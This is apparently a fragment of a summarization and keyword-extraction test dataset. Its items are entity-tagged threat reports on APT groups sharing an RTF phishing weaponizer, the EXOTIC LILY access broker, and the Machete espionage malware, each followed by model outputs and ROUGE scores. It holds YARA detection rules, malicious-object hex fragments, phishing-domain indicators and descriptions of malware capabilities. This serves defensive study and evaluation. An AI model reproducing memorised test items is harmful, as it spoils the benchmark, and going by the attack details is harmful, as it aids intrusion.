, [CARDINAL] three distinct clusters of [NORP] Chinese APT activity have been observed utilizing these [ORG] RTF files sharing unique object dimensions . [PERSON] Goblin [PERSON] Panda [PERSON] / [PERSON] Conimes has historically targeted [GPE] Vietnam utilizing RTF phishing attachments delivering a payload identified as \u201c QCRat \u201d . Temp . Periscope / [ORG] APT40 [ORG] / [ORG] Leviathan has historically targeted [GPE] U.S. and international institutions associated with naval and maritime issues affecting [LOC] the [LOC] South [LOC] China [LOC] Sea while supporting the theft of intellectual property . Temp . Trident / Dagger Panda & [PERSON] Nomad [PERSON] Panda [PERSON] / [PERSON] Icefog have historically targeted the Mongolia region ( [PERSON] Dagger [PERSON] Panda ) alongside [NORP] Russian and [LOC] Central [LOC] Asia ( [PERSON] Nomad [PERSON] Panda ) likely as part of economic espionage efforts in support of the Belt and Road Initiative . Versions of the custom payload [ORG] Fucobha have been identified as part of these campaigns , which was [ORDINAL] first identified in [DATE] 2013 . In addition to these distinct APTs using a common RTF weaponizer , they share a common post - exploitation execution technique . Rather than downloading and executing a malicious file , the RTF document drops and executes shellcode via an [ORG] OLE package that then drops a distinctive source file to execute a payload . This method has been identified earlier by security analysts . [PERSON] Anomali [PERSON] Labs identified the presence of the unique object dimension \" objw871\\\\objh811\\\\objscalex8\\\\objscaley8 \u201d in [ORG] RTF files involved with this post - exploitation method . This object dimension can be used to identify multiple malicious [ORG] RTF files attributed to [NORP] Chinese [ORG] APT groups . The presence of both a shared phishing weaponizer and a shared post - exploitation execution technique between these groups is indicative of a noteworthy tool and [ORG] TTP overlap . This overlap indicates that these [ORG] APT groups may be part of a shared supply chain which receives tools for phishing exploitation from a shared [ORG] Digital Quartermaster.5789ActorGoblin Panda [GPE] a.k.a . ConimesTargetingPotential MotivationMethodologyUnique [PERSON] ToolsVietnam and [NORP] Southeast [NORP] AsiaEspionage aligned with commercial and [LOC] South [LOC] China [LOC] Sea issuesRTF Phishing followed by shellcode executed via an [ORG] OLE package dropping distinctive source fileQCRat PayloadTemp . [PERSON] Periscope [GPE] a.k.a APT40 [GPE] a.k.a [ORG] LeviathanU.S. [ORG] Defense ; Maritime ; [PERSON] Academic [PERSON] Institutions ; [ORG] International [ORG] & [ORG] Political organizationsIntellectual property theft and military espionageRTF Phishing followed by shellcode executed via an [ORG] OLE package dropping distinctive source fileDADBOD [ORG] MURKYTOPMongolia and [ORG] Central AsiaEconomic espionage for [ORG] Belt [ORG] & [ORG] Road [ORG] InitiativeRTF [ORG] Phishing followed by shellcode executed via an [ORG] OLE package dropping distinctive source fileFucobha [GPE] a.k.a [GPE] Temp . Trident document matching these identified object dimensions and using the [NORP] Chinese post - exploitation execution technique contains a last modified date of [DATE] November 18 , [DATE] 2017 . [CARDINAL] Two samples attributed to Temp . Periscope contain last modified dates from [DATE] 2007 that appear to be manipulated and therefore can not be accurately dated based on this information . The [ORDINAL] first identified RTF samples can be attributed to Temp . Periscope with [PERSON] Goblin [PERSON] Panda later beginning to utilize these [ORG] RTF files in phishing campaigns circa [DATE] January [DATE] 2018 . Temp . Trident appears to have begun using these [ORG] RTF files in [DATE] late [DATE] February [DATE] 2018 based on publicly available samples . Notably the Sidewinder APT RTF phishing samples were observed in the wild subsequent to use by [NORP] Chinese [ORG] APT groups with samples not observed until [DATE] April [DATE] 4 , [DATE] 2018 based on last modified dates of public samples . Most recently a sample was identified in [DATE] October [DATE] 2018.While CVE-2017 - 11882 was the primary [ORG] RTF exploit observed between [DATE] November [DATE] 2017 [DATE] and [DATE] September [DATE] 2018 , a shift in TTPs was observed with an updated weaponizer targeting CVE-2018 - 0802 . Subsequent to [DATE] October 23 , [DATE] 2018 . RTF phishing files attributed to [NORP] Chinese [ORG] APT groups and containing these unique object dimensions shifted their TTPs to target this new [ORG] CVE . The targeted vulnerability is highly similar to CVE-2017 - 11882 and proof of concepts have been released which effectively target both vulnerabilities with minimal changes to the exploit code . No Sidewinder APT samples targeting CVE-2018 - 0802 were publicly identified at the time of analysis.2/6Conclusion : Are Exploits Being Traded from [FAC] the [FAC] Royal [FAC] Road [FAC] or [ORG] Imperial Highway?The presence of unique RTF object dimensions , object data strings indicative of shared obfuscation methods , and shared post - exploitation [ORG] TTP \u2019s amongst [NORP] Chinese [ORG] APT groups indicate that a shared [ORG] RTF phishing weaponizer may be in use by multiple adversaries in the [ORG] APAC region . The constancy of the object dimensions and object data across [ORG] APT groups , despite weaponzier updates targeting new [ORG] CVE \u2019s , reinforces the shared nature of this tool . The distribution of a shared weaponizer for phishing is consistent with historic reporting regarding the Goblin Panda APT that previously utilized a shared phishing weaponizer for CVE-2012 - 0158 . Additionally , the practice of utilizing a shared [ORG] Digital Quartermaster and phishing builder was previously observed across [NORP] Chinese [ORG] APT campaigns unrelated to these actors [DATE] as [DATE] early [DATE] as [DATE] 2013 . This provides a historic precedent for tool sharing of this kind . The shared post - exploitation methods used by [PERSON] Temp . [PERSON] Periscope , [PERSON] Temp . Trident , and [PERSON] Goblin [PERSON] Panda , when examined in context of this shared [ORG] RTF phishing weaponizer , supports a conclusion that these APTs may share a common supply chain and [ORG] Digital Quartermaster.10Alternatively , analysis indicating this RTF phishing weaponizer overlaps with the otherwise unrelated Sidewinder [ORG] APT campaigns raises a larger question about tool acquisition by APTs in the [ORG] APAC region . Although not confirmed at this time , this occurrence could indicate that [ORG] Indian [ORG] & [ORG] Chinese [ORG] APT groups are using an overlapping supply chain for exploits . Similar supply chains have been known to consist of an ecosystem of underground exploit brokers and weaponizer developers providing tools to an exclusive list of clientele . However , despite the apparent overlap , this analysis has not determined if this RTF weaponizer originated in [GPE] India , in [GPE] China , or elsewhere . Publicly observed samples indicate that tool adoption was [ORDINAL] first seen by the [NORP] Chinese group Temp . [PERSON] Periscope , with [PERSON] Goblin [PERSON] Panda , and [PERSON] Temp . Trident following suit prior to usage by [ORG] the [ORG] Sidewinder [ORG] APT . While it is possible that this temporal adoption may indicate context about the weaponizer \u2019s origin , unlike the ancient trading roads that have historically connected [GPE] India and [GPE] China , the current exchange of offensive cyber tools remains opaque . Further research is necessary at this time to substantiate the possibility of an active shared [ORG] APT supply chain in the [ORG] APAC region . [PERSON] Anomali [PERSON] Labs has developed the following [GPE] Yara signatures that can be used to identify RTF samples containing the object dimensions consistent with [ORG] APT phishing activity : [ORG] YARA RULESrule RTF_weaponizer_objh300 { version = \" [CARDINAL] 1.0 \" date = \" [DATE] 2018 - 11 - 13 \" Bulletin = \" url \" description = \" Rule to detect Malicious [ORG] RTF based on object dimension \" strings:$S1= \" objw2180\\\\objh300 \" $ RTF= \" { \\\\rt\"condition:$RTF at 0 and $ [MONEY] S1 } 3/6rule RTF_Malicous_Object { version = \" [CARDINAL] 1.0 \" date = \" [DATE] 2018 - 11 - 13 \" Bulletin = \" url \" description = \" Rule to detect Malicious [ORG] RTF based on object dimension \" strings:$S1= \" objw871\\\\objh811\\\\objscalex8\\\\objscaley8 \" $ RTF= \" { \\\\rt\"condition:$RTF at 0 and $ [MONEY] S1 } [ORG] HashActorCVEExploitRTF [ORG] Object Contentsobjw2180\\objh300{\\*\\objclass Equation.3 } { \\*\\objdata 01050000020000000B0000004571756174objw2180\\objh300{\\*\\objclass Equation.3 } { \\*\\objdata 01050000020000000B0000004571756174objw2180\\objh300{\\*\\objclass Equation.3 } { \\*\\objdata 01050000020000000B0000004571756174objw2180\\objh300{\\*\\objclass Equation.3 } { \\*\\objdata 01050000020000000B0000004571756174objw2180\\objh300{\\*\\objclass Equation.3 } { \\*\\objdata 01050000020000000B0000004571756174objw2180\\objh300{\\*\\objclass Equation.3 } { \\*\\objdata 01050000020000000B0000004571756174objw2180\\objh300{\\*\\objclass Equation.3 } { \\*\\objdata 01050000020000000B0000004571756174objw2180\\objh300{\\*\\objclass Equation.3 } { \\*\\objdata 01050000020000000B0000004571756174objw2180\\objh300{\\*\\objclass Equation.3 } { \\*\\objdata 01050000020000000B0000004571756174objw2180\\objh300{\\*\\objclass Equation.3 } Date2007:01:30 09:12:002007:01:30 09:12:002017 - 11- 18 21:52:00'2017:12:08 00:50:002017:12:08 06:29:002018:01:10 09:47:002018:01:15 14:47:002018:01:16 11:32:002018:01:17 [CARDINAL] 09:09:002018:01:31 11:24:00objw2180\\objh300{\\objdata 554567{\\*\\objdata 01050000020000000B0000004571756174696F6E2E2018:02:22 20:08:00objw2180\\objh300{\\objdata 554567{\\*\\objdata 01050000020000000B0000004571756174696F6E2E2018:02:22 20:08:00objw2180\\objh300{\\objdata 554567{\\*\\objdata 01050000020000000B0000004571756174696F6E2E2018:02:22 V1Temp . Periscope CVE- V1Temp . Periscope CVE- V1Temp . Periscope CVE- V1Temp . Periscope CVE- V1Temp . Periscope CVE- PandaConimes [ORG] / [ORG] Goblin QCrat)Conimes [ORG] / [ORG] Goblin PandaConimes [ORG] / [ORG] Goblin 0802objw2180\\objh300{\\objdata [CARDINAL] 554567{\\*\\objdata [CARDINAL] 01050000020000000B0000004571756174696F6E2E2018:02:22 [CARDINAL] 20:08:00objw2180\\objh300{\\objdata 554567{\\*\\objdata 01050000020000000B0000004571756174696F6E2E2018:03:07 11:22:00objw2180\\objh300{\\objdata 554567{\\*\\objdata 01050000020000000B0000004571756174696F6E2E2018:03:14 17:34:00objw2180\\objh300{\\objdata 554567{\\*\\objdata 01050000020000000B0000004571756174696F6E2E2018:03:27 09:30:00objw2180\\objh300{\\objdata 554567{\\*\\objdata 01050000020000000B0000004571756174696F6E2E2018:03:27 09:30:00objw2180\\objh300{\\objdata 554567{{\\*\\objdata 1389E614020000000B0000004571756174696F6E22018:04:04 08:54:00'objw2180\\objh300{\\objdata 554567{{\\*\\objdata 1389E614020000000B0000004571756174696F6E22018:04:05 [CARDINAL] 10:32:00objw2180\\objh300{\\objdata [CARDINAL] 554567{\\*\\objdata [CARDINAL] 01050000020000000B0000004571756174696F6E2E2018:04:22 [CARDINAL] 11:39:00objw2180\\objh300{\\objdata [CARDINAL] 554567{\\*\\objdata [CARDINAL] 01050000020000000B0000004571756174696F6E2E2018:04:22 [CARDINAL] 11:40:00objw2180\\objh300{\\objdata [CARDINAL] 554567{\\*\\objdata 01050000020000000B0000004571756174696F6E2E2018:04:23 01:01:00objw2180\\objh300{\\objdata 554567{\\*\\objdata 01050000020000000B0000004571756174696F6E2E2018:08:19 18:12:00objw2180\\objh300{\\objdata 554567{\\*\\objdata 01050000020000000B0000004571756174696F6E2E2018:08:23 08:28:00objw2180\\objh300{\\objdata 554567{\\*\\objdata 01050000020000000B0000004571756174696F6E2E2018:08:23 08:28:00objw2180\\objh300{\\objdata 554567{\\*\\objdata 09:08:00objw2180\\objh300{\\objdata [CARDINAL] 554567{\\*\\objdata [CARDINAL] 15:42:00objw2180\\objh300{\\objdata [CARDINAL] 554567{\\*\\objdata [CARDINAL] 09:56:00objw2180\\objh300{\\objdata [PRODUCT] 554567{\\*\\objdata [PRODUCT] 10:43:00objw2180\\objh300{\\objdata [PRODUCT] 554567{\\*\\objdata 09:22:00objw2180\\objh300{\\objdata 554567{\\*\\objdata 04:37:00objw2180\\objh300{\\objdata 554567{\\*\\objdata that Runs CalcConimes / Goblin 0802\\objdata [CARDINAL] 554567{{\\*\\objdata [CARDINAL] 1389E614020000000B0000004571756174696F6E2N / A\\*\\objclass [CARDINAL] Equation.3}{\\*\\objdata [CARDINAL] 02:38:36'objw2180\\objh300{\\objdata 554567{\\*\\objdata 09:26:00'1 url url url url url execution - side - loading/ ; url 5bc1a7e7c84c5 url url url - Nomad [ORG] Panda [ORG] / [ORG] Temp . Trident Samples8 url url the AuthorAnomali Labs6/6", "generated_text": "the RTF files; APT groups; Chinese; Indian; APT groups; Sidewinder; Goblin Panda/Conimes; Temp; Periscope; Temp; Trident; Dagger Panda; Icefog; Chinese; a shared supply chain; phishing weaponizers; the RTF files; objects; obfuscation methods; a unique object dimension; a shared resource chain; the group; use; different POST-exploitation TTPs; a unique post-exploitation execution chain; a shared supply chain; the acquisition; these tools; payloads; distinct operations; attribution; similarities; a distinct network; obfuscation methods.", "ref_text": "<START-1>The document analyzes overlaps in tactics, techniques, and procedures (TTPs) between Chinese and Indian advanced persistent threat (APT) groups. Specifically, it examines similarities in weaponized RTF phishing files used by several Chinese APTs (Goblin Panda, Temp.Periscope, Temp.Trident) and one Indian APT (Sidewinder). Analysis identified shared object dimensions and obfuscation methods in the RTF files of these groups, indicating use of a common phishing kit and potentially a shared supply chain. However, the groups diverge in post-exploitation stages. Sidewinder downloads payloads via HTAs while the Chinese APTs use shellcode and source files. This points to separate operators tailoring the tools after initial acquisition. The timeline shows the Chinese groups leveraging the phishing kit first, with Sidewinder adopting it months later. This raises the possibility of Chinese-Indian APT overlap in exploit trading, though the origin of the kit is undetermined. The report concludes that more research is needed on supply chain relationships between advanced threat groups in Asia. Defenders should monitor for shifts in TTPs that may indicate APTs acquiring new shared tools and exploits.<END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.550561797752809, "gpt3/lexical/rouge_rouge2": 0.21468926553672316, "gpt3/lexical/rouge_rougeL": 0.29213483146067415, "gpt3/lexical/rouge_rougeLsum": 0.29213483146067415, "gpt3_generated_text": ["This article analyzes the use of weaponized RTF phishing files by APT groups aligned with Chinese and Indian state interests. The analysis reveals a shared object dimension and obfuscation methods among the APT groups, indicating a potential shared supply chain for the acquisition of exploits and phishing weaponizers. While the Chinese APT groups demonstrate a distinct pattern of post-exploitation techniques, the Indian APT group, Sidewinder, has a unique post-exploitation execution chain. The article also discusses the use of object dimensions to track RTF phishing weaponizers and identifies a unique object dimension present in the RTF files used by various Asian APT groups. Additionally, the article highlights the shared obfuscation output among the samples, further suggesting the utilization of a common phishing weaponizer. Despite these similarities, distinct execution techniques were found, with Sidewinder using an HTA file and the Chinese APT groups dropping shellcode via an OLE package. Overall, this analysis raises questions about the possibility of a shared supply chain between Chinese and Indian APT groups for the acquisition of tools and the deployment of distinct operations."]}, {"split_name": "test", "sample_id": "test_27", "prompt_text": "Extract the keywords: Exposing initial access broker with ties to Contiblog.google/threat-analysis-group/exposing-initial-access-broker-ties-conti/Threat Analysis Group [DATE] Mar [DATE] 17 , [CARDINAL] 2022Vlad StolyarovBenoit SevensIn [DATE] early [DATE] September [DATE] 2021 , [ORG] Threat [ORG] Analysis [ORG] Group ( TAG ) observed a financially motivated threat actor we refer to as [ORG] EXOTIC [ORG] LILY , exploiting a [DATE] 0day in [LOC] Microsoft [LOC] MSHTML ( CVE- 2021 - 40444 ) . Investigating this group 's activity , we determined they are an [ORG] Initial [ORG] Access [ORG] Broker ( [ORG] IAB ) who appear to be working with the [NORP] Russian cyber crime gang known as FIN12 ( [ORG] Mandiant , [ORG] FireEye ) / WIZARD SPIDER ( CrowdStrike).Initial access brokers are the opportunistic locksmiths of the security world , and it \u2019s a full- time job . These groups specialize in breaching a target in order to open the doors \u2014 or the Windows \u2014 to the malicious actor with the highest bid . [ORG] EXOTIC [ORG] LILY is a resourceful , financially motivated group whose activities appear to be closely linked with data exfiltration and deployment of human - operated ransomware such as [PERSON] Conti and Diavol . At the peak of [ORG] EXOTIC [ORG] LILY \u2019s activity , we estimate they were sending [CARDINAL] more [CARDINAL] than [CARDINAL] 5,000 emails a day , to [CARDINAL] as [CARDINAL] many [CARDINAL] as [CARDINAL] 650 targeted organizations globally . Up until [DATE] November [DATE] 2021 , the group seemed to be targeting specific industries such as IT , cybersecurity and healthcare , but as of late we have seen them attacking a wide variety of organizations and industries , with less specific focus . We have observed this threat actor deploying tactics , techniques and procedures ( TTPs ) that are traditionally associated with more targeted attacks , like spoofing companies and employees as a means of gaining trust of a targeted organization through email campaigns that are believed to be sent by real human operators using little - to - no automation . Additionally and rather uniquely , they leverage legitimate file - sharing services like [PERSON] WeTransfer , [ORG] TransferNow and [ORG] OneDrive to deliver the payload , further evading detection mechanisms . This level of human - interaction is rather unusual for cyber crime groups focused on mass scale operations . Spoofing Organizations and [ORG] IdentitiesEXOTIC [ORG] LILY \u2019s attack chain has remained relatively consistent throughout the time we \u2019ve been tracking the group:1/7One notable technique is the use of domain and identity spoofing as a way of gaining additional credibility with a targeted organization . In the majority of cases , a spoofed domain name was identical to a real domain name of an existing organization , with the only difference being a change of [ORG] TLD to \u201c .us \u201d , \u201c .co \u201d or \u201c .biz\u201d . Initially , the group would create entirely fake personas posing as employees of a real company . That would sometimes consist of creating social media profiles , personal websites and generating a fake profile picture using a public service to create an AI- generated human face . In [DATE] November [DATE] 2021 , the group began to impersonate real company employees by copying their personal data from social media and business databases such as RocketReach and CrunchBase.2/7One of the fake social media profiles created by [ORG] EXOTIC [ORG] LILYUsing spoofed email accounts , attackers would then send spear phishing emails under the pretext of a business proposal , such as seeking to outsource a software development project or an information security service . Example of an [ORG] EXOTIC [ORG] LILY phishing email impersonating as an employee of a legitimate companyAttackers would sometimes engage in further communication with the target by attempting to schedule a meeting to discuss the project 's design or requirements . At the final stage , the attacker would upload the payload to a public file - sharing service ( [ORG] TransferNow , TransferXL , [PERSON] WeTransfer or [ORG] OneDrive ) and then use a built - in email notification feature to share the file with the target , allowing the final email to originate from the email address of a legitimate file - sharing service and not the attacker \u2019s email , which presents additional detection challenges.3/7Attacker uses a file - sharing service email notification feature to send [ORG] BazarLoader [ORG] ISO payloadHuman - Operated Phishing at ScaleFurther evidence suggests an operator \u2019s responsibilities might include : customizing the initial \u201c business proposal \u201d templates when [ORDINAL] first reaching out to a targeted organization ; handling further communications in order to gain affinity and trust ; uploading malware ( acquired from another group ) to a file - sharing service prior to sharing it with the target . A breakdown of the actor \u2019s communication activity shows the operators are working a fairly typical [CARDINAL] 9 - to-5 job , with very little activity during the weekends . Distribution of the actor \u2019s working hours suggest they might be working from a [LOC] Central or an [LOC] Eastern [LOC] Europe timezone.4/7Breakdown of actor \u2019s communication activity . Deeper color indicates more activity . [ORG] Malware and [ORG] AttributionAlthough the group came to our attention initially due to its use of documents containing an exploit for CVE-2021 - 40444 , they later switched to the delivery of [ORG] ISO files with hidden [PRODUCT] BazarLoader DLLs and [ORG] LNK shortcuts . These samples have some indicators that suggest they were custom - built to be used by the group . For example , metadata embedded in the [ORG] LNK shortcuts shows that a number of fields , such as the \u201c Machine Identifier \u201d and \u201c [WORK_OF_ART] Drive [WORK_OF_ART] Serial [WORK_OF_ART] Number \u201d were shared with [ORG] BazarLoader ISOs distributed via other means , however other fields such as the command line arguments were unique for samples distributed by [ORG] EXOTIC [ORG] LILY.In [ORG] March , the group continued delivering [ORG] ISO files , but with a [ORG] DLL containing a custom loader which is a more advanced variant of a [ORDINAL] first - stage payload previously seen during CVE-2021 - 40444 exploitation . The loader can be recognized by its use of a unique user- agent \u201c bumblebee \u201d which both variants share . The malware , hence dubbed [ORG] BUMBLEBEE , uses [ORG] WMI to collect various system details such as OS version , user name and domain name , which are then exfiltrated in JSON format to a C2 . In response , it expects to receive [CARDINAL] one of the several supported \u201c tasks \u201d , which include execution of shellcode , dropping and running executable files . At the time of the analysis , [ORG] BUMBLEBEE was observed to fetch [ORG] Cobalt [ORG] Strike payloads.5/7EXOTIC LILY activities overlap with a group tracked as [CARDINAL] DEV-0413 ( [ORG] Microsoft ) and were also described by Abnormal in their recent post . Earlier reports of attacks exploiting [LAW] CVE- [LAW] 2021 - 40444 ( by [ORG] Microsoft and other members of the security community ) have also indicated overlaps between domains involved in the delivery chain of an exploit and infrastructure used for [ORG] BazarLoader and [PERSON] Trickbot distribution . We believe the shift to deliver [ORG] BazarLoader , along with some other indicators such as a unique Cobalt Strike profile ( described by RiskIQ ) further confirms the existence of a relationship between [ORG] EXOTIC [ORG] LILY and actions of a [NORP] Russian cyber crime group tracked as [ORG] WIZARD SPIDER ( [ORG] CrowdStrike ) , FIN12 ( [ORG] Mandiant , [ORG] FireEye ) and [CARDINAL] DEV-0193 ( [ORG] Microsoft ) . While the nature of those relationships remains unclear , [ORG] EXOTIC [ORG] LILY seems to operate as a separate entity , focusing on acquiring initial access through email campaigns , with follow - up activities that include deployment of [PERSON] Conti and Diavol ransomware , which are performed by a different set of actors . [PERSON] Improving [PERSON] User [PERSON] ProtectionAs part of our efforts to combat serious threat actors , we use results of our research to improve the safety and security of our products . In collaboration with [ORG] Gmail [ORG] and [ORG] Safe [ORG] Browsing , we are improving protections by adding additional warnings for emails originating from website contact forms , better identification of spoofing , and adjusting the reputation of email file sharing notifications . Additionally , we \u2019re working with Google \u2019s [ORG] CyberCrime [ORG] Investigation [ORG] Group to share relevant details and indicators with law enforcement . TAG is committed to sharing our findings as a way of raising awareness with the security community , and with companies and individuals that might have been targeted or suffered from this threat actor \u2019s activities . We hope that improved understanding of the group \u2019s tactics and techniques will enhance threat hunting capability and lead to stronger user protections across industry . Indicators of Compromise ( IOCs ) Recent domains used in email campaigns : conlfex[.]com kvnational[.]us6/7prmflltration[.]com al - ghurair[.]us", "generated_text": "the document; ties; EXOTIC LILY; a financially motivated threat actor; IAB; working; Russian; FIN12; Mandiant; FireEye; CrowdStrike; The group; 5,000 emails; 650; organizations; cybersecurity; healthcare; the peak; September 2021; the group; tactics; techniques; procedures; TTPs; spoofing companies; employees; trust; legitimate file-sharing services; WeTransfer; OneDrive; the payload; evasion; detection; a spoofed domain name; a real name; an existing organization; the payload; legitimate file-sharing services; WeTransfer; OneDrive; the payload; reconnaissance; social media; the group; an opportunistic locksmith; its activity; the highest bid.", "ref_text": "<START-1>Google's Threat Analysis Group (TAG) has been tracking a financially motivated threat actor named EXOTIC LILY that exploits vulnerabilities and works as an initial access broker. EXOTIC LILY appears linked to the ransomware groups Conti and Diavol, and the cybercrime group WIZARD SPIDER/FIN12. At its peak, EXOTIC LILY was sending 5,000 phishing emails a day to 650 organizations. EXOTIC LILY uses social media profiles and email spoofing to send spear phishing emails under the guise of business proposals, such as outsourcing software development projects or information security services. The attackers would schedule meetings with their targets to discuss project design or requirements, and then upload payloads to public file-sharing services using built-in email notification features. This makes it challenging for detection systems to identify the attacker's email address. Human-operated phishing at scale is a common tactic used by EXOTIC LILY operators, who customize initial proposal templates, handle further communications with targets, and upload malware from other groups to file-sharing services before sharing it with the target. EXOTIC LILY has switched from delivering documents containing an exploit for CVE-2021-40444 to delivering ISO files with hidden BazarLoader DLLs and LNK shortcuts. These samples have indicators that suggest they were custom-built for the group. While EXOTIC LILY operates independently, focusing on acquiring initial access through email campaigns, it collaborates with other actors to deploy Conti and Diavol ransomware. Google is improving user protection by adding additional warnings for emails originating from website contact forms, better identification of spoofing, and adjusting the reputation of email file sharing notifications. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4470588235294118, "gpt3/lexical/rouge_rouge2": 0.14184397163120568, "gpt3/lexical/rouge_rougeL": 0.18823529411764706, "gpt3/lexical/rouge_rougeLsum": 0.18823529411764706, "gpt3_generated_text": ["The article discusses a financially motivated threat actor known as EXOTIC LILY, who is identified as an Initial Access Broker (IAB) working with the Russian cyber crime gang FIN12/WIZARD SPIDER. The group specializes in breaching targets and selling access to the highest bidder. EXOTIC LILY has been observed targeting various industries, including IT, cybersecurity, and healthcare, and has been deploying tactics such as domain and identity spoofing to gain credibility with targeted organizations. They also use legitimate file-sharing services like WeTransfer and OneDrive to deliver malware, evading detection mechanisms. The group's activities involve extensive human interaction, which is uncommon for mass-scale cyber crime operations. The article provides insights into the group's attack chain, including the creation of fake personas, social media profiles, and spoofed email accounts to carry out spear phishing campaigns. The operators of EXOTIC LILY appear to work regular business hours, suggesting they may be located in a Central or Eastern European timezone."]}, {"split_name": "test", "sample_id": "test_28", "prompt_text": "Extract the keywords: 8/6/2019Sharpening the Machete | WeLiveSecuritySharpening [DATE] the [DATE] Machetewelivesecurity.com/2019/08/05/sharpening-machete-cyberespionageAugust [DATE] 5 , [CARDINAL] 2019Latin [GPE] America is often overlooked when it comes to persistent threats and groups with politically motivated targets . There is , however , an ongoing case of cyberespionage against high - pro\ufb01le organizations that has managed to stay under the radar . The group behind these attacks has stolen gigabytes of con\ufb01dential documents , mostly from military organizations . It is still very active at the time of this publication , regularly introducing changes to its malware , infrastructure and spearphishing campaigns . ESET has been tracking a new version of [GPE] Machete ( the group \u2019s Python - based toolset ) that was \ufb01rst seen in [DATE] April [DATE] 2018 . While the main functionality of the backdoor remains the same as in previous versions , it has been extended with new features over the course of [DATE] a [DATE] year . Targets From [DATE] the [DATE] end [DATE] of [DATE] March up until [DATE] the [DATE] end [DATE] of [DATE] May [DATE] 2019 , ESET researchers observed that there were [CARDINAL] more [CARDINAL] than [CARDINAL] 50 victimized computers actively communicating with the [ORG] C&C server . This amounts to gigabytes of data being uploaded [DATE] every [DATE] week . [CARDINAL] More [CARDINAL] than [CARDINAL] half of the compromised computers were in the [NORP] Venezuelan military forces , whereas the others were related to education , police , and foreign affairs sectors . This extends to other countries in [LOC] Latin [LOC] America , with the [NORP] Ecuadorean military being another organization highly targeted with the [GPE] Machete malware . The distribution of this malware in these countries is shown in Figure [CARDINAL] 1.url the Machete | WeLiveSecurityFigure [CARDINAL] 1 . Countries with [PERSON] Machete victims in [CARDINAL] 2019Malware operators [ORG] Machete \u2019s operators use effective spearphishing techniques . Their long run of attacks , focused on [NORP] Latin [NORP] American countries , has allowed them to collect intelligence and re\ufb01ne their tactics over [DATE] the [DATE] years . They know their targets , how to blend into regular communications , and which documents are of the most value to steal . Not only does Machete ex\ufb01ltrate common of\ufb01ce suite documents , but also specialized \ufb01le types used by geographic information systems ( [ORG] GIS ) software . The group is interested in \ufb01les that describe navigation routes and positioning using military grids . The [GPE] Machete group sends very speci\ufb01c emails directly to its victims , and these change from target to target . These emails contain either a link to , or an attachment of , a compressed self- extracting archive that runs the malware and opens a document that serves as a decoy . Figure [CARDINAL] 2 is a typical [ORG] PDF \ufb01le displayed to a potential victim during compromise . To trick unsuspecting targets , [PERSON] Machete operators use real documents they have previously stolen ; Figure [CARDINAL] 2 is a classi\ufb01ed military document that is dated [DATE] May [DATE] 21 [DATE] , [DATE] 2019 , [DATE] the [DATE] same [DATE] day the related .zip \ufb01le was \ufb01rst sent to targets . ESET has seen more cases like this where stolen documents dated on [DATE] one [DATE] particular [DATE] day were bundled with malware and used on the same day as lures to compromise new victims.sturl the Machete | WeLiveSecurityFigure [CARDINAL] 2 . Decoy ( [ORG] PDF \ufb01le ) in [CARDINAL] one of the [GPE] Machete downloaders ( blurred)The kind of documents used as decoys are sent and received legitimately several times a day by the group \u2019s targets . For example , [PERSON] Radiogramas are documents used for communication in the [NORP] Venezuelan military forces . Attackers take advantage of that , along with their knowledge of military jargon and etiquette , to craft very convincing phishing emails . [ORG] Main characteristics The [PERSON] Machete group is very active and has introduced several changes to its malware since a new version was released in [DATE] April [DATE] 2018 . Previous versions were described by [PERSON] Kaspersky in [DATE] 2014 and Cylance in [DATE] 2017 . In Figure [CARDINAL] 3 we show the components for the new version of the [GPE] Machete malware . Figure [CARDINAL] 3 . Components of [ORG] MacheteThe \ufb01rst part of the attack consists of a downloader that comes as a self - extracting archive , made with 7z SFX Builder . Once the archive is unpacked by the self - extraction code , the extractor opens a [ORG] PDF or [ORG] Microsoft [ORG] Of\ufb01ce \ufb01le that serves as a decoy , and then runs the downloader executable from the archive . That executable is another self - extracting \ufb01le that contains the actual downloader binary ( a py2exe component ) and a con\ufb01guration \ufb01le with the downloader \u2019s target URL as an encrypted string . All download URLs we have seen are at either [PERSON] Dropbox or [PRODUCT] Google [PRODUCT] Docs . The \ufb01les at these URLs have all been self - extracting ( RAR SFX ) archives containing encrypted con\ufb01guration and py2exe backdoor components . Since [DATE] May [DATE] 2019 , however , the [GPE] Machete operators stopped usingurl the [GPE] Machete | WeLiveSecurityThe py2exe binaries can be decompiled to obtain Python code . All of the components \u2013 downloaders and backdoors \u2013 are obfuscated with pyobfuscate . This has been used in previous versions of the malware as well . Figure [CARDINAL] 4 shows part of [CARDINAL] one of these obfuscated scripts . Figure [CARDINAL] 4 . Script obfuscated with pyobfuscateSince [DATE] August [DATE] 2018 , the [GPE] Machete components have been delivered with an extra layer of obfuscation . The scripts now contain a block of zlib - compressed , base64 - encoded text which , after being decoded , produces a script like the one in Figure [CARDINAL] 4 . This \ufb01rst layer of obfuscation is produced using pymini\ufb01er with the -gzip parameter . Backdoor components [ORG] Machete \u2019s dropper is a [ORG] RAR SFX executable . [CARDINAL] Three py2exe components are dropped : [GPE] GoogleCrash.exe , [ORG] Chrome.exe and [NORP] GoogleUpdate.exe . A single con\ufb01guration \ufb01le , jer.dll , is dropped , and it contains base64\u2011encoded text that corresponds to AES\u2011encrypted strings . A schema summarizing the components is shown in Figure [DATE] 5.url the Machete | WeLiveSecurityFigure [CARDINAL] 5 . Backdoor py2exe components of [GPE] MacheteGoogleCrash.exe is the main component of the malware . It schedules execution of the other [CARDINAL] two components and creates [PRODUCT] Windows [PRODUCT] Task [PRODUCT] Scheduler tasks to achieve persistence . The [ORG] Chrome.exe component is responsible for collection of data from the victimized computer . It can : Take screenshots [PERSON] Log keystrokes [PRODUCT] Access the clipboard AES - encrypt and ex\ufb01ltrate documents [ORG] Detect newly inserted drives and copy \ufb01les Execute other binaries downloaded from the [ORG] C&C server Retrieve speci\ufb01c \ufb01les from the system Retrieve user pro\ufb01le data from several browsers Collect geolocation of victims and information about nearby Wi [LOC] - Fi networks [ORG] Perform physical ex\ufb01ltration to removable drivesThe Machete operators are interested in obtaining speci\ufb01c \ufb01le types from their targets . Apart from [ORG] Microsoft [ORG] Of\ufb01ce documents , drives are searched for : Backup \ufb01les Database \ufb01les Cryptographic keys ( [ORG] PGP ) [PERSON] Files for geographic information systems ( topographic maps , navigation routes , etc.)Regarding the geolocation of victims , [ORG] Chrome.exe collects data about nearby Wi [LOC] - Fi networks and sends it to [ORG] the [ORG] Mozilla [ORG] Location [ORG] Service API . In short , this application provides 